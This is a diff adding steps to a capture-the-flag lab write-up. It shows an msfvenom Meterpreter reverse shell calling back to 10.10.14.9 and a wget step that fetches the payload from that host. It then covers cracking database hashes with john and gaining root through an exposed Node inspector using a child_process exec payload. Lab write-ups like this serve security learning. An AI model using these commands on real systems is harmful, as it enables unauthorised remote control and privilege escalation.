@@ -85,3 +85,27 @@ We then create a meterpreter reverse shell using msfvenom and save it in the sam
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1313 -f elf > shell.elf
 ```
+
+We send the request above using Burp and edit the command to "wget http://10.10.14.9/shell.elf -O /tmp/shell.elf". We see the request made in our python webserver. 
+
+We start a listener in Meterpreter, then we send two requests, one adding execution to the file, and the other executing it. Our Meterpreter reverse-shell is active. 
+
+We are in the root directory of the site. We see reactor.db and download it. Using sqlite3, we find the users table has hashes for administrator and engineer. We grab those and run john against them. 
+
+John gives us the password for engineer: reactor1. 
+
+We can now ssh into the host and grab the user flag.
+
+Looking into running processes using ps -aux shows us that root is running node on inspector mode out of port 9229. 
+
+We find that you can connect to the node process using node inspect localhost:9229 on the victim host. 
+
+Since we are in ssh, we can close our Meterpreter session and start a new one, no changes needed. 
+
+We then execute the following:
+
+```
+debug> exec("process.mainModule.require('child_process').exec('/tmp/shell.elf')")
+```
+
+This opens a Meterpreter shell as root. Now we just grab the root flag and sit back. 
